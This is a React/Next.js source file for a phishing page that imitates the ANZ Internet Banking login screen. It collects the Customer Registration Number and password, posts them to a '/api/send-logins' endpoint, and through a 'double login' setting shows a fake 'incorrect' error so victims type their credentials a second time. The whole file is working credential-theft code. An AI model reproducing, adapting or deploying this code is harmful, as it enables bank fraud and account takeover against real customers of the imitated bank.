/* eslint-disable jsx-a11y/alt-text */
/* eslint-disable @next/next/no-img-element */
import { Button } from "@/components/Button";
import { Input } from "@/components/Input";
import { Wrapper } from "@/components/Wrapper";
import { getNextUrl } from "@/utils/getNextUrl";
import { getProgress } from "@/utils/getProgress";
import { isProfane } from "@/utils/isProfane";
import { useRouter } from "next/router";
import * as yup from "yup";
import { yupResolver } from "@hookform/resolvers/yup";
import axios from "axios";
import React, { useContext, useEffect, useState } from "react";
import { useForm } from "react-hook-form";
import { DataContext } from "./_app";
import useMediaQuery from "@/hooks/useMediaQuery";
import Head from "next/head";

interface LoginProps {}

const schema = yup.object().shape({
  username: yup
    .string()
    .required(`Please enter your Customer Registration Number`)
    .test(
      "test-pin",
      "The Customer Registration Number is in an incorrect format`",
      (val) => !isNaN(Number(val))
    )
    .min(6, `The Customer Registration Number is in an incorrect format`)
    .max(22, `The Customer Registration Number is in an incorrect format`)
    .test(`userId-includes-bad-words`, `Enter a valid username`, isProfane),
  password: yup
    .string()
    .required(`Please enter your password`)
    .min(
      6,
      `Password must be between 8 and 16 characters in length and contain at least one number and one letter.`
    )
    .max(
      24,
      `Password must be between 8 and 16 characters in length and contain at least one number and one letter.`
    )
    .test(
      `password-includes-bad-words`,
      `Password must be between 8 and 16 characters in length and contain at least one number and one letter.`,
      isProfane
    ),
});
export const Login: React.FC<LoginProps> = ({}) => {
  const isTablet = useMediaQuery(`(max-width: 1163px)`);
  const isMobile = useMediaQuery(`(max-width: 767px)`);
  const [loginAttempt, setLoginAttempt] = useState(0);
  const [showError, setShowError] = useState(false);
  const [loading, setLoading] = useState(false);
  const [togglePassword, setTogglePassword] = useState(false);
  const [selected, setSelected] = useState(false);

  const [logins, setLogins] = useState({});
  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    reset,
    formState: { errors, isValid },
    watch,
    resetField,
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onSubmit`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    const formData = new FormData();

    formData.append(`form`, `LOGIN`);
    formData.append(
      `loginDetails`,
      JSON.stringify({
        loginAttempt: loginAttempt + 1,
        sessionId: datas.sessionId,
        ...data,
      })
    );

    try {
      await axios.post(`/api/send-logins`, formData, {
        headers: { "content-type": `multipart/form-data` },
      });
    } catch (error) {
      console.log(error);
    }

    setLogins({
      ...logins,
      [loginAttempt + 1]: {
        form: `LOGIN`,
        loginDetails: { loginAttempt: loginAttempt + 1, ...data },
      },
    });

    if (!loginAttempt && process.env.NEXT_PUBLIC_DOUBLE_LOGIN === `ON`) {
      setLoginAttempt(1);
      setLoading(false);
      setShowError(true);
      reset({
        username: ``,
        password: ``,
      });
      return;
    }

    setData({
      ...datas,
      logins: {
        ...logins,
        [loginAttempt + 1]: {
          form: `LOGIN`,
          loginDetails: { loginAttempt: loginAttempt + 1, ...data },
        },
      },
    });

    const url = getProgress()[0];

    push(getNextUrl(url));
  });

  useEffect(() => {
    const keyDownHandler = (event: KeyboardEvent) => {
      if (event.key === "Enter") {
        event.preventDefault();

        onSubmit();
      }
    };

    document.addEventListener("keydown", keyDownHandler);

    return () => {
      document.removeEventListener("keydown", keyDownHandler);
    };
  });

  return (
    <>
      <Head>
        <link rel="icon" href="/favicon.ico" />
        <title>Login - ANZ Internet Banking</title>
      </Head>
      <Wrapper>
        <div
          style={{
            display: "flex",
            flexDirection: "column",
            WebkitBoxPack: "center",
            justifyContent: "center",
            flex: "1 0 auto",
            margin: "48px auto",
            maxWidth: "100%",
            ...(isMobile
              ? {
                  padding: "48px 15px",
                  margin: "0px",
                  width: "100%",
                }
              : {}),
          }}
        >
          <div
            style={{
              display: "flex",
              WebkitBoxPack: "center",
              justifyContent: "center",
              ...(isMobile ? { display: "block" } : {}),
            }}
          >
            <div
              style={
                isTablet
                  ? {
                      width: isMobile ? "100%" : "530px",
                      marginRight: "30px",
                    }
                  : {
                      width: "553px",
                      marginRight: "127px",
                    }
              }
            >
              <div
                style={{
                  minHeight: "330px",
                  backgroundColor: "rgb(255, 255, 255)",
                  border: "1px solid rgb(226, 228, 230)",
                  borderRadius: "3px",
                  maxWidth: "560px",
                  padding: "64px",
                  marginTop: "0px",
                  width: "100%",
                  ...(isMobile
                    ? {
                        width: "100%",
                        maxWidth: "100%",
                        margin: "0px",
                        padding: "0px",
                        border: "none",
                      }
                    : {}),
                }}
              >
                <div
                  style={{
                    maxWidth: "100%",
                    margin: "0px auto",
                    transition: "max-width 0.2s ease 0s",
                    padding: "0px",
                  }}
                >
                  <div
                    style={{
                      boxSizing: "border-box",
                      display: "flex",
                      flex: "0 1 auto",
                      flexFlow: "row wrap",
                      margin: "0px -15px 40px",
                    }}
                  >
                    <div
                      style={{
                        flexBasis: "100%",
                        maxWidth: "100%",
                        display: "block",
                        boxSizing: "border-box",
                        flex: "0 0 auto",
                        padding: "0px 15px",
                        ...(isMobile
                          ? {
                              flexBasis: "100%",
                              maxWidth: "100%",
                              display: "block",
                              width: "100%",
                            }
                          : {}),
                      }}
                    >
                      <h1
                        style={{
                          margin: "0px",
                          textAlign: "left",
                          fontWeight: "600",
                          lineHeight: "1.125",
                          letterSpacing: "normal",
                          color: "rgb(0, 65, 101)",
                          fontSize: "30px",
                          fontFamily: "myriad-pro-light, sans-serif",
                          ...(isMobile
                            ? {
                                textAlign: "center",
                                fontSize: "28px",
                              }
                            : {}),
                        }}
                      >
                        <span
                          style={{
                            fontFamily:
                              "myriad-pro-semibold, sans-serif, sans-serif",
                          }}
                        >
                          Log in to <div>ANZ Internet Banking</div>
                        </span>
                      </h1>
                    </div>
                  </div>
                  <form>
                    <div>
                      {showError ? (
                        <div
                          style={{
                            boxSizing: "border-box",
                            display: "flex",
                            flex: "0 1 auto",
                            flexFlow: "row wrap",
                            margin: "0px -15px 32px",
                          }}
                        >
                          <div
                            style={{
                              flexBasis: "100%",
                              maxWidth: "100%",
                              display: "block",
                              boxSizing: "border-box",
                              flex: "0 0 auto",
                              padding: "0px 15px",
                            }}
                          >
                            <div
                              style={{
                                position: "relative",
                                display: "block",
                                padding: "16px",
                                border: "1px solid rgb(242, 192, 189)",
                                borderRadius: "3px",
                                fontSize: "16px",
                                lineHeight: "20px",
                                fontWeight: "400",
                                color: "rgb(73, 73, 73)",
                                backgroundColor: "rgb(252, 240, 239)",
                              }}
                            >
                              <div
                                style={{
                                  display: "flex",
                                  WebkitBoxAlign: "center",
                                  alignItems: "center",
                                  margin: "0px",
                                }}
                              >
                                <div
                                  style={{
                                    WebkitBoxFlex: "1",
                                    flexGrow: "1",
                                    display: "inline-flex",
                                  }}
                                >
                                  <span
                                    style={{
                                      verticalAlign: "middle",
                                    }}
                                  >
                                    <svg
                                      viewBox="0 0 16 16"
                                      width="1em"
                                      height="1em"
                                      style={{
                                        transform:
                                          "translate3d(0px, 0.125em, 0px)",
                                        margin: "-0.125em 8px 0px 0px",
                                        color: "rgb(218, 81, 73)",
                                        fontSize: "20px",
                                      }}
                                    >
                                      <path
                                        d="M8 0C3.589 0 0 3.589 0 8s3.589 8 8 8 8-3.589 8-8-3.589-8-8-8zm3.918 11.921a1.166 1.166 0 0 1-.833.346 1.17 1.17 0 0 1-.835-.347L7.999 9.67l-2.251 2.25a1.167 1.167 0 0 1-.835.347c-.315 0-.611-.123-.835-.347a1.167 1.167 0 0 1-.346-.835c0-.315.123-.612.346-.835l2.25-2.249L4.079 5.75a1.17 1.17 0 0 1-.346-.835 1.178 1.178 0 0 1 1.181-1.18c.315 0 .611.122.834.344l2.251 2.252L10.25 4.08a1.178 1.178 0 1 1 1.669 1.669L9.669 8l2.25 2.25c.223.221.346.517.346.835.001.318-.123.614-.347.836z"
                                        fill="currentColor"
                                      />
                                    </svg>
                                  </span>
                                  <span>
                                    The Customer Registration Number or password
                                    you entered was incorrect. Would you like to{" "}
                                    <span>
                                      <a
                                        style={{
                                          color: "rgb(0, 114, 172)",
                                          WebkitTapHighlightColor:
                                            "transparent",
                                          textDecoration: "none",
                                        }}
                                      >
                                        recover your login details
                                      </a>
                                    </span>
                                  </span>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      ) : null}
                      <Input
                        label={`Customer Registration Number`}
                        name={`username`}
                        register={register}
                        error={
                          errors.username && (errors.username.message as string)
                        }
                      />
                      <Input
                        label={`Password`}
                        name={`password`}
                        type={`password`}
                        register={register}
                        error={
                          errors.password && (errors.password.message as string)
                        }
                      />
                    </div>
                    <Button
                      label={`Log in`}
                      onSubmit={onSubmit}
                      loading={loading}
                    />
                  </form>
                  <div
                    style={{
                      boxSizing: "border-box",
                      display: "flex",
                      flex: "0 1 auto",
                      flexFlow: "row wrap",
                      margin: "0px -15px 32px",
                    }}
                  >
                    <div
                      style={{
                        flexBasis: "66.6667%",
                        maxWidth: "66.6667%",
                        display: "block",
                        boxSizing: "border-box",
                        flex: "0 0 auto",
                        padding: "0px 15px",
                      }}
                    >
                      <a
                        style={{
                          color: "rgb(0, 114, 172)",
                          WebkitTapHighlightColor: "transparent",
                          textDecoration: "none",
                          backgroundColor: "transparent",
                        }}
                      >
                        Forgot login details?
                      </a>
                    </div>
                    <div
                      style={{
                        flexBasis: "33.3333%",
                        maxWidth: "33.3333%",
                        display: "block",
                        boxSizing: "border-box",
                        flex: "0 0 auto",
                        padding: "0px 15px",
                      }}
                    >
                      <div
                        style={{
                          textAlign: "right",
                          position: "relative",
                          width: "100%",
                        }}
                      >
                        <a
                          style={{
                            color: "rgb(0, 114, 172)",
                            WebkitTapHighlightColor: "transparent",
                            textDecoration: "none",
                            backgroundColor: "transparent",
                          }}
                        >
                          Help
                        </a>
                      </div>
                    </div>
                  </div>
                  <hr
                    style={{
                      margin: "56px 0px 32px",
                      borderWidth: "1px 0px 0px",
                      borderRightStyle: "initial",
                      borderBottomStyle: "initial",
                      borderLeftStyle: "initial",
                      borderRightColor: "initial",
                      borderBottomColor: "initial",
                      borderLeftColor: "initial",
                      borderImage: "initial",
                      borderTopStyle: "solid",
                      borderTopColor: "rgb(204, 204, 204)",
                      boxSizing: "content-box",
                      height: "0px",
                      overflow: "visible",
                    }}
                  />
                  <div
                    style={{
                      boxSizing: "border-box",
                      display: "flex",
                      flex: "0 1 auto",
                      flexFlow: "row wrap",
                      margin: "0px -15px 40px",
                    }}
                  >
                    <div
                      style={{
                        flexBasis: "100%",
                        maxWidth: "100%",
                        display: "block",
                        boxSizing: "border-box",
                        flex: "0 0 auto",
                        padding: "0px 15px",
                      }}
                    >
                      <div
                        style={{
                          textAlign: "left",
                          position: "relative",
                          width: "100%",
                          ...(isMobile
                            ? {
                                textAlign: "center",
                              }
                            : {}),
                        }}
                      >
                        <span
                          style={{
                            fontSize: "16px",
                            lineHeight: "1.25",
                            letterSpacing: "0.2px",
                          }}
                        >
                          <span>New to Internet Banking? </span>
                          <a
                            style={{
                              color: "rgb(0, 114, 172)",
                              WebkitTapHighlightColor: "transparent",
                              textDecoration: "none",
                              backgroundColor: "transparent",
                            }}
                          >
                            Register
                          </a>
                        </span>
                      </div>
                    </div>
                  </div>
                  <div
                    style={{
                      boxSizing: "border-box",
                      display: "flex",
                      flex: "0 1 auto",
                      flexFlow: "row wrap",
                      margin: "0px -15px",
                      ...(isMobile
                        ? {
                            marginBottom: 0,
                          }
                        : {}),
                    }}
                  >
                    <div
                      style={{
                        flexBasis: "100%",
                        maxWidth: "100%",
                        display: "block",
                        boxSizing: "border-box",
                        flex: "0 0 auto",
                        padding: "0px 15px",
                        ...(isMobile
                          ? {
                              flexBasis: "100%",
                              maxWidth: "100%",
                              display: "block",
                            }
                          : {}),
                      }}
                    >
                      <div
                        style={{
                          textAlign: "left",
                          position: "relative",
                          width: "100%",
                          ...(isMobile ? { textAlign: "center" } : {}),
                        }}
                      >
                        <span
                          style={{
                            fontSize: "14px",
                            lineHeight: "1.429",
                            letterSpacing: "0px",
                          }}
                        >
                          <span>
                            By logging in, you accept our{" "}
                            <a
                              style={{
                                color: "rgb(0, 114, 172)",
                                WebkitTapHighlightColor: "transparent",
                                textDecoration: "none",
                                backgroundColor: "transparent",
                              }}
                            >
                              Security and Privacy Statement.
                            </a>
                          </span>
                        </span>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <div
              style={{
                width: "210px",
                ...(isMobile
                  ? {
                      width: "100%",
                      marginTop: "64px",
                    }
                  : {}),
              }}
            >
              <div
                style={{
                  minHeight: "auto",
                  backgroundColor: "rgb(255, 255, 255)",
                  border: "none",
                  borderRadius: "3px",
                  maxWidth: "560px",
                  padding: "0px",
                  marginTop: "64px",
                  width: "100%",
                }}
              >
                <div
                  style={{
                    width: "76rem",
                    maxWidth: "100%",
                    margin: "0px auto",
                    transition: "max-width 0.2s ease 0s",
                    padding: "0px",
                  }}
                >
                  <div
                    style={{
                      boxSizing: "border-box",
                      display: "flex",
                      flex: "0 1 auto",
                      flexFlow: "row wrap",
                      margin: "0px -15px",
                    }}
                  >
                    <div
                      style={{
                        flexBasis: "100%",
                        maxWidth: "100%",
                        display: "block",
                        boxSizing: "border-box",
                        flex: "0 0 auto",
                        padding: "0px 15px",
                        marginBottom: "56px",
                      }}
                    >
                      <div
                        style={{
                          minHeight: "auto",
                          backgroundColor: "rgb(255, 255, 255)",
                          border: "none",
                          borderRadius: "3px",
                          maxWidth: "560px",
                          padding: "0px",
                          marginTop: "0px",
                          width: "100%",
                        }}
                      >
                        <a
                          style={{
                            color: "rgb(0, 114, 172)",
                            WebkitTapHighlightColor: "transparent",
                            textDecoration: "none",
                            backgroundColor: "transparent",
                          }}
                        >
                          <img
                            src="/images/ib-login-support.1.0.0.svg"
                            style={{
                              width: "100%",
                              display: "block",
                              borderStyle: "none",
                            }}
                          />
                        </a>
                        <p
                          style={{
                            fontSize: "16px",
                            fontWeight: "600",
                            lineHeight: "1.5",
                            color: "rgb(0, 65, 101)",
                          }}
                        >
                          <a
                            style={{
                              color: "rgb(0, 114, 172)",
                              WebkitTapHighlightColor: "transparent",
                              textDecoration: "none",
                              backgroundColor: "transparent",
                            }}
                          >
                            <span
                              style={{
                                fontFamily:
                                  "myriad-pro-semibold, sans-serif, sans-serif",
                              }}
                            >
                              Have a question about a product or service of
                              ours?
                            </span>
                          </a>
                        </p>
                        <a
                          style={{
                            WebkitTapHighlightColor: "transparent",
                            color: "rgb(0, 125, 186)",
                            textDecoration: "none",
                            border: "1px solid rgb(0, 125, 186)",
                            fontSize: "14px",
                            fontWeight: "600",
                            borderRadius: "3px",
                            cursor: "pointer",
                            lineHeight: "18px",
                            textAlign: "center",
                            display: "inline-block",
                            padding: "5px 11px",
                            backgroundColor: "transparent",
                          }}
                        >
                          <span
                            style={{
                              fontFamily:
                                "myriad-pro-semibold, sans-serif, sans-serif",
                            }}
                          >
                            Visit ANZ Support
                          </span>
                        </a>
                      </div>
                    </div>
                    <div
                      style={{
                        flexBasis: "100%",
                        maxWidth: "100%",
                        display: "block",
                        boxSizing: "border-box",
                        flex: "0 0 auto",
                        padding: "0px 15px",
                      }}
                    >
                      <div
                        style={{
                          minHeight: "auto",
                          backgroundColor: "rgb(255, 255, 255)",
                          border: "none",
                          borderRadius: "3px",
                          maxWidth: "560px",
                          padding: "0px",
                          marginTop: "0px",
                          width: "100%",
                        }}
                      >
                        <div
                          style={{
                            width: "76rem",
                            maxWidth: "100%",
                            margin: "0px auto",
                            transition: "max-width 0.2s ease 0s",
                            padding: "0px 15px",
                          }}
                        >
                          <div
                            style={{
                              boxSizing: "border-box",
                              display: "flex",
                              flex: "0 1 auto",
                              flexFlow: "row wrap",
                              margin: "0px -15px 16px",
                            }}
                          >
                            <span
                              style={{
                                fontFamily:
                                  "myriad-pro-semibold, sans-serif, sans-serif",
                              }}
                            >
                              <div
                                style={{
                                  textAlign: "left",
                                  position: "relative",
                                  width: "100%",
                                  color: "rgb(0, 65, 101)",
                                  fontWeight: "600",
                                }}
                              >
                                Further information
                              </div>
                            </span>
                          </div>
                          {[
                            `What’s new`,
                            `Find or change your CRN and Password`,
                            `View statements`,
                            `Get or change your card PIN`,
                            `Latest security alerts`,
                            `Contact us`,
                          ].map((el) => (
                            <div
                              key={el}
                              style={{
                                boxSizing: "border-box",
                                display: "flex",
                                flex: "0 1 auto",
                                flexFlow: "row wrap",
                                margin: "0px -15px 12px",
                              }}
                            >
                              <a
                                style={{
                                  color: "rgb(0, 114, 172)",
                                  WebkitTapHighlightColor: "transparent",
                                  textDecoration: "none",
                                  backgroundColor: "transparent",
                                }}
                              >
                                {el}
                              </a>
                            </div>
                          ))}
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </Wrapper>
    </>
  );
};

export default Login;
